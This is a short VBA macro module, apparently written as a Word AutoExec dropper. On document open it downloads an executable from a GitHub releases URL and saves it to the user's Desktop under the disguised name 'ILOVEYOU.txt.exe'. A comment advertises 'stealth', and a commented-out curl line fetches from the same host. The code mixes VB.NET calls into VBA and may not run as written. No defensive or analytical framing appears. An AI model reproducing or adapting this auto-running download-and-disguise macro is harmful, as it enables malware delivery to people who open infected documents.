Attribute VB_Name = "AutoExec"
Private Sub AutoExec()
' Usage of private for stealth methods
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Normal.AutoExec.AutoExec"
    'Dim RetVal
    'RetVal = Shell("curl -LJO https://github.com/blj-magnar/", 1)
    My.Computer.Network.DownloadFile(
        "https://github.com/blj-magnar/magnar/archive/releases/magnar.exe",
        "%CURRENTUSER\Desktop\ILOVEYOU.txt.exe")
End Sub
